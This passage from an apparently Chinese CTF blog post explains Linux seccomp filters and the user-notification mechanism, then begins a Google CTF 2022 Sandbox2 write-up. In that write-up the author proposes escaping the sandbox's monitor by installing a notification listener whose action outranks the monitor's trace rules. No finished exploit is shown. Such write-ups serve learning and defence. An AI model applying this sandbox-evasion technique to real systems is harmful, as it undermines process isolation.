BPF_STMT(BPF_RET | BPF_K,</span></span><br><span class="line">        <span class="comment">//          SECCOMP_RET_ERRNO | (f_errno &amp; SECCOMP_RET_DATA)),</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* [7] Destination of architecture mismatch: kill process. */</span></span><br><span class="line">        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = ARRAY_SIZE(filter),</span><br><span class="line">        .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (syscall(__NR_seccomp,SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,&amp;prog)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;seccomp&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)) &#123;</span><br><span class="line">        perror(<span class="string">&quot;prctl&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (install_filter(__NR_write, AUDIT_ARCH_X86_64, <span class="number">1</span>))</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line"></span><br><span class="line">    syscall(__NR_write, <span class="number">1</span>, <span class="string">&quot;write is avaliable\n&quot;</span>, <span class="number">19</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/seccomp_ctf/1-1.png"></p>
<p>成功输出。（最后一行不知道为什么）</p>
<p>或者也可以直接使用 prctl 的系统调用创建一个 seccomp 沙箱：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">filter</span>[] =</span> &#123;</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00000002</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7fff0000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7fff0000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00000001</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7fff0000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x80000000</span>&#125;,</span><br><span class="line">	&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">prog</span> =</span> &#123;</span><br><span class="line">        .len = <span class="keyword">sizeof</span>(filter) / <span class="keyword">sizeof</span>(filter[<span class="number">0</span>]),</span><br><span class="line">        .filter = filter,</span><br><span class="line">    &#125;;</span><br><span class="line">    syscall(__NR_prctl,PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// Apply the filter.</span></span><br><span class="line">	syscall(__NR_prctl,PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);</span><br><span class="line">    <span class="comment">// Fork is forbidden </span></span><br><span class="line">    fork();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>filter 中的值可以从 seccomp-tools 中看到。</p>
<h2 id="Other-Samples"><a href="#Other-Samples" class="headerlink" title="Other Samples"></a>Other Samples</h2><p>也可以使用一些 seccomp 库函数提供的函数，来创建 seccomp 沙箱：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc -no-pie --static simple_syscall_seccomp.c -o simple_syscall_seccomp -lseccomp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	scmp_filter_ctx ctx;</span><br><span class="line">	ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, __NR_write, <span class="number">0</span>);</span><br><span class="line">	seccomp_load(ctx);</span><br><span class="line">	syscall(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&quot;abcd\n&quot;</span>,<span class="number">5</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Tip: seccmp lib would use malloc and free while prctl doesn’t</p>
</blockquote>
<p>此外还可以通过 prctl 直接创建 seccomp 沙箱。和前面提到的类似：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc ./main -o main</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	prctl(PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">sfi</span>[] =</span> &#123;</span><br><span class="line">		&#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000004</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x09</span>,<span class="number">0xc000003e</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x35</span>,<span class="number">0x07</span>,<span class="number">0x00</span>,<span class="number">0x40000000</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x0000003b</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x00000001</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000024</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000020</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x15</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00000010</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7fff0000</span>&#125;,</span><br><span class="line">		&#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> =</span> &#123;<span class="number">12</span>,sfi&#125;;</span><br><span class="line">	prctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;sfp);</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="seccomp-unotify"><a href="#seccomp-unotify" class="headerlink" title="seccomp_unotify"></a>seccomp_unotify</h1><p>Seccomp user-space 的通知机制。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/audit.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">seccomp</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> operation, <span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">void</span> *args)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, SECCOMP_IOCTL_NOTIF_RECV, <span class="keyword">struct</span> seccomp_notif *req)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, SECCOMP_IOCTL_NOTIF_SEND, <span class="keyword">struct</span> seccomp_notif_resp *resp)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, SECCOMP_IOCTL_NOTIF_ID_VALID, __u64 *id)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, SECCOMP_IOCTL_NOTIF_ADDFD, <span class="keyword">struct</span> seccomp_notif_addfd *addfd)</span>;</span><br></pre></td></tr></table></figure>

<p>在 seccomp filter 的常规使用中，如何处理系统调用的决定由 filter 本身决定。相反，user-space 的通知机制允许 seccomp filter 将系统调用的处理委托给另一个用户空间进程。注意，该机制显然不是作为实现安全策略的方法。在下面的讨论中，应用 seccomp filter 的线程被称为 <text style="color:green">target</text>，由用户空间通知机制通知的进程被称为 <text style="color:green">supervisor</text>。</p>
<p>具有适当特权的 <text style="color:green">supervisor</text> 可以使用用户空间通知机制来代表 <text style="color:green">target</text> 执行操作。用户空间通知机制的优点是：<text style="color:green">supervisor</text> 通常能够检索有关 <text style="color:green">target</text> 和执行的系统调用的信息，而 seccomp filter 本身无法检索这些信息。(seccomp filter 在内核内的虚拟机上运行，因此它可以获得的信息和可以执行的操作受到限制)</p>
<p>target 和 supervisor 执行的过程如下：</p>
<ol>
<li><p>target 以常规的方式建立 seccomp filter，但是有两点不同：</p>
<ul>
<li>seccomp 的 flags 参数必须包括 SECCOMP_FILTER_FLAG_NEW_LISTENER。因此成功执行的返回值是一个新的用于接收 notification 的 “listening” fd。一个线程只能应用一个 “listening” seccomp filter。</li>
<li>在适当的情况下，seccomp filter 会返回 action value: SECCOMP_RET_USER_NOTIF，这个返回值会触发一个 notification event。</li>
</ul>
</li>
<li><p>为了能使 supervisor 使用 listening fd 得到 notifications，这个 fd 必须从 target 传递给 supervisor。实现这点的一种方法是通过 target 和 supervisor 直接的 UNIX socket 套接字连接传递 fd（使用 SCM_RIGHTS 的附加信息），另一种办法是通过 <a href="https://man7.org/linux/man-pages/man2/pidfd_getfd.2.html">pidfd_getfd</a>。</p>
</li>
<li><p>supervisor 将在 listening fd 上接收到 notification events。这些 events 将会返回 seccomp_notif 结构。因为这个结构的 size 可能会随着内核版本而改变，所有 supervisor 必须首先通过 seccomp(2) 的SECCOMP_GET_NOTIF_SIZES operation 获得其结构的 size，这步会返回一个 seccomp_notif_sizes 结构。supervisor 申请一个大小为 seccomp_notif_sizes.seccomp_notif 字节的缓冲区来接收 notification events。此外，supervisor 还申请一个大小为 seccomp_notif_sizes.seccomp_notif_resp 字节的缓冲区来存放向内核即 target 的 response（一个 seccomp_notif_resp 结构）。</p>
<details class="note "><summary><p>这是<code>seccomp_notif</code>和<code>seccomp_notif_resp</code>的结构</p>
</summary>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_notif</span> &#123;</span></span><br><span class="line">               __u64  id;              <span class="comment">/* Cookie */</span></span><br><span class="line">               __u32  pid;             <span class="comment">/* TID of target thread */</span></span><br><span class="line">               __u32  flags;           <span class="comment">/* Currently unused (0) */</span></span><br><span class="line">               <span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> <span class="title">data</span>;</span>   <span class="comment">/* See seccomp(2) */</span></span><br><span class="line">           &#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_notif_resp</span> &#123;</span></span><br><span class="line">               __u64 id;           <span class="comment">/* Cookie value */</span></span><br><span class="line">               __s64 val;          <span class="comment">/* Success return value */</span></span><br><span class="line">               __s32 error;        <span class="comment">/* 0 (success) or negative error number */</span></span><br><span class="line">               __u32 flags;        <span class="comment">/* See below */</span></span><br><span class="line">           &#125;;</span><br></pre></td></tr></table></figure>

</details>
</li>
<li><p>target 执行其工作，包括 seccomp filter 会控制系统调用。当这些系统调用其中之一引起 filter 返回 SECCOMP_RET_USER_NOTIF action value，内核就不会执行这个系统调用，而是暂时阻塞 target（在可被信号中断的 sleep 状态）然后在 listening fd 中生成一个 notification event。</p>
</li>
<li><p>supervisor 可以重复的 monitor listening fd 等待 SECCOMP_RET_USER_NOTIF 这个触发事件。为了完成这点，supervisor 使用 SECCOMP_IOCTL_NOTIF_RECV ioctl 操作来读取关于 notification event 的信息，这个操作会阻塞直到获得一个可用的 event。最终会返回一个包含 target 正在请求执行的系统调用的信息的 seccomp_notif  结构。</p>
</li>
<li><p>SECCOMP_IOCTL_NOTIF_RECV ioctl 操作返回的 seccomp_notif 结构包括了传给 seccomp filter 相同的信息（一个 seccomp_data 结构）。这个信息允许 supervisor 发现 target 执行系统调用的系统调用号和参数。此外，notification event 包括了触发 notification 的 thread ID 和一个在后续 SECCOMP_IOCTL_NOTIF_ID_VALID 和 SECCOMP_IOCTL_NOTIF_SEND 操作中使用的唯一的 cookie 值。notification 中的信息可以用来发现 target 的系统调用的指针参数值。(这是在 seccomp 过滤器中无法做到的。) supervisor 可以做到这一点的一个方法是打开相应的 &#x2F;proc&#x2F;[tid]&#x2F;mem 文件，并从与 notification event 中提供的指针参数值相对应的位置读取字节。 (supervisor 必须注意避免在这样做时可能出现的条件竞争)。此外，supervisor 还可以访问其他在用户空间可见的系统信息，但这些信息是无法从 seccomp filter 中访问的。</p>
</li>
<li><p>前面步骤已经获得了信息，supervisor 可以选择在 response 中为 target 的系统调用请求执行一个操作（当返回 SECCOMP_RET_USER_NOTIF action value 时，target 请求执行的系统调用未执行，在等待 response）。一个例子是和容器相关，target 可能在容器内，没有足够的 capabilities 在容器的 mount namespace 挂载一个文件系统。但是，supervisor 可能是一个有更多权限的进程，有足够的 capabilities 去完成挂载操作。</p>
</li>
<li><p>supervisor 发送一个 response 给 notification。这个 response 中的信息将被内核用于构造一个返回值给 target 的系统调用并提供一个分配给 target 的 errno 变量的值。response 通过 SECCOMP_IOCTL_NOTIF_SEND ioctl 发送，用于传递一个 seccomp_notif_resp 结构给内核。这个结构必须包含前文提到的 SECCOMP_IOCTL_NOTIF_RECV 操作返回的 seccomp_notif 结构中的 cookie 值。</p>
</li>
<li><p>一旦 notification 发送，target 线程被阻塞的系统调用就会返回由 supervisor 提供的 notification response 中的信息。</p>
</li>
</ol>
<p>作为最后两步中的变种，supervisor 可以发送一个 response，告知了内核它应该执行 target 线程的系统调用。这类 response 的 flags 必须包括 SECCOMP_USER_NOTIF_FLAG_CONTINUE，error 和 val 字段必须为 0。这类 response 在以下情况很有用：<strong>supervisor 需要对 target 的系统调用进行比 seccomp filter 更深入的分析（例如检查指针参数的值），并且在决定该系统调用不需要 supervisor 的模拟后，supervisor 希望该系统调用在 target 中正常执行。也就是会无视 seccomp filter 而直接放行。</strong></p>
<h1 id="challenge-googlectf-2022-S2"><a href="#challenge-googlectf-2022-S2" class="headerlink" title="challenge: googlectf-2022-S2"></a>challenge: googlectf-2022-S2</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>将用户输入的程序放在 sandbox 中运行，只允许 fork、seccomp、ioctl、exit 这几个系统调用。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="literal">nullptr</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stderr, <span class="literal">nullptr</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Sandbox2 executor!&quot;</span>);</span><br><span class="line">  <span class="type">int</span> fd = <span class="built_in">ReadBinary</span>();</span><br><span class="line">  std::string path = absl::<span class="built_in">StrCat</span>(<span class="string">&quot;/proc/&quot;</span>, <span class="built_in">getpid</span>(), <span class="string">&quot;/fd/&quot;</span>, fd);</span><br><span class="line">  <span class="keyword">auto</span> policy = sandbox2::<span class="built_in">PolicyBuilder</span>()</span><br><span class="line">    .<span class="built_in">AllowStaticStartup</span>()</span><br><span class="line">    .<span class="built_in">AllowFork</span>()</span><br><span class="line">    .<span class="built_in">AllowSyscalls</span>(&#123;</span><br><span class="line">      __NR_seccomp,</span><br><span class="line">      __NR_ioctl,</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="built_in">AllowExit</span>()</span><br><span class="line">    .<span class="built_in">AddFile</span>(sapi::file_util::fileops::<span class="built_in">MakeAbsolute</span>(<span class="string">&quot;flag&quot;</span>, sapi::file_util::fileops::<span class="built_in">GetCWD</span>()))</span><br><span class="line">    .<span class="built_in">AddDirectory</span>(<span class="string">&quot;/dev&quot;</span>)</span><br><span class="line">    .<span class="built_in">AddDirectory</span>(<span class="string">&quot;/proc&quot;</span>)</span><br><span class="line">    .<span class="built_in">AllowUnrestrictedNetworking</span>()</span><br><span class="line">    .<span class="built_in">BuildOrDie</span>();</span><br><span class="line">  std::vector&lt;std::string&gt; args = &#123;<span class="string">&quot;sol&quot;</span>&#125;;</span><br><span class="line">  <span class="keyword">auto</span> executor = std::<span class="built_in">make_unique</span>&lt;sandbox2::Executor&gt;(path, args);</span><br><span class="line">  <span class="function">sandbox2::Sandbox2 <span class="title">sandbox</span><span class="params">(std::move(executor), std::move(policy))</span></span>;</span><br><span class="line">  sandbox2::Result result = sandbox.<span class="built_in">Run</span>();</span><br><span class="line">  <span class="keyword">if</span> (result.<span class="built_in">final_status</span>() != sandbox2::Result::OK) &#123;</span><br><span class="line">    <span class="built_in">warnx</span>(<span class="string">&quot;Sandbox2 failed: %s&quot;</span>, result.<span class="built_in">ToString</span>().<span class="built_in">c_str</span>());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据1.3节中 SECCOMP_RET_USER_NOTIF 的优先级会大于 SECCOMP_RET_TRACE，那么创建一个 SECCOMP LISTENER，利用其接收到的 action value 优先级大于 SECCOMP TRACE，就可以自定义规则处理这些系统调用而监控进程将不会被触发。</p>
<p>在 sandboxd-api 中可以发现许多 SECCOMP_RET_TRACE 并且这些情况都会被 monitor 处理。</p>
<p>根据 policy.cc 中的注释：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The final policy is the concatenation of:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  1. default policy (GetDefaultPolicy, private),</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  2. user policy (user_policy_, public),</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  3. default KILL action (avoid failing open if user policy did not do it).</span></span><br></pre></td></tr></table></figure>

<p>最后应用到 filter 中的规则由以上三部分组成，其中 GetDefaultPolicy：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> TRACE(val) \</span></span><br><span class="line"><span class="meta">	BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_TRACE | (val &amp; SECCOMP_RET_DATA))</span></span><br><span class="line"></span><br><span class="line"><span class="function">std::vector&lt;sock_filter&gt; <span class="title">Policy::GetDefaultPolicy</span><span class="params">()</span> <span class="type">const</span> </span>&#123;</span><br><span class="line">  bpf_labels l = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  std::vector&lt;sock_filter&gt; policy = &#123;</span><br><span class="line">    <span class="comment">// If compiled arch is different from the runtime one, inform the Monitor.</span></span><br><span class="line">    LOAD_ARCH,</span><br><span class="line">    <span class="built_in">JEQ32</span>(Syscall::<span class="built_in">GetHostAuditArch</span>(), <span class="built_in">JUMP</span>(&amp;l, past_arch_check_l)),</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(SAPI_X86_64)</span></span><br><span class="line">    <span class="built_in">JEQ32</span>(AUDIT_ARCH_I386, <span class="built_in">TRACE</span>(sapi::cpu::kX86)),  <span class="comment">// 32-bit sandboxee</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="built_in">TRACE</span>(sapi::cpu::kUnknown),</span><br><span class="line">    <span class="built_in">LABEL</span>(&amp;l, past_arch_check_l),</span><br></pre></td></tr></table></figure>

<p>经过阅读这几个 policy 构成的源码得出，最终的 policy &#x3D; default policy + user policy + default Kill action。user policy 也就是我们程序中定义的规则。</p>
<blockquote>
<p>Tips：</p>
<p>linux seccomp 是安全的。他允许我们禁止一个可用的 syscall 但是不允许我们 allow 一个被禁止的 syscall。</p>
</blockquote>
<p>如下测试是先允许 write 再禁止：</p>
<details class="note "><summary><p>测试源码</p>
</summary>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_filter</span> strict_filter2[] = &#123;</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_LD | BPF_W | BPF_ABS,</span><br><span class="line">                <span class="built_in">offsetof</span>(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        <span class="built_in">BPF_JUMP</span>(BPF_JMP | BPF_JEQ | BPF_K, __NR_seccomp, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="built_in">BPF_JUMP</span>(BPF_JMP | BPF_JEQ | BPF_K, __NR_write, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="built_in">BPF_JUMP</span>(BPF_JMP | BPF_JEQ | BPF_K, __NR_open, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_fprog</span> prog2 = &#123;</span><br><span class="line">        .len = <span class="built_in">sizeof</span>(strict_filter2) / <span class="built_in">sizeof</span>(strict_filter2[<span class="number">0</span>]),</span><br><span class="line">        .filter = strict_filter2,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">syscall</span>(__NR_prctl,PR_SET_NO_NEW_PRIVS,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">syscall</span>(__NR_seccomp,SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,&amp;prog2);</span><br><span class="line">    <span class="built_in">syscall</span>(__NR_write,<span class="number">1</span>,<span class="string">&quot;1\n&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_filter</span> strict_filter3[] = &#123;</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_LD | BPF_W | BPF_ABS,</span><br><span class="line">                <span class="built_in">offsetof</span>(<span class="keyword">struct</span> seccomp_data, nr)),</span><br><span class="line">        <span class="built_in">BPF_JUMP</span>(BPF_JMP | BPF_JEQ | BPF_K, __NR_write, <span class="number">0</span>, <span class="number">1</span>),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_fprog</span> prog3 = &#123;</span><br><span class="line">        .len = <span class="built_in">sizeof</span>(strict_filter3) / <span class="built_in">sizeof</span>(strict_filter3[<span class="number">0</span>]),</span><br><span class="line">        .filter = strict_filter3,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">syscall</span>(__NR_seccomp,SECCOMP_SET_MODE_FILTER,<span class="number">0</span>,&amp;prog3);</span><br><span class="line">    <span class="built_in">syscall</span>(__NR_write,<span class="number">1</span>,<span class="string">&quot;2\n&quot;</span>,<span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</details>

<p><img src="/img/seccomp_ctf/1-2.png"></p>
<p>如下测试是先禁止 write 再允许：</p>
<details class="note "><summary><p>测试源码</p>
</summary>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sock_filter</span> strict_filter2[] = &#123;</span><br><span class="line">        <span class="built_in">BPF_STMT</span>(BPF_LD | BPF_W | BPF_ABS,</span><br><span class="line">                <span class="built_in">offsetof</span>(<span class="keyword">struct</span> 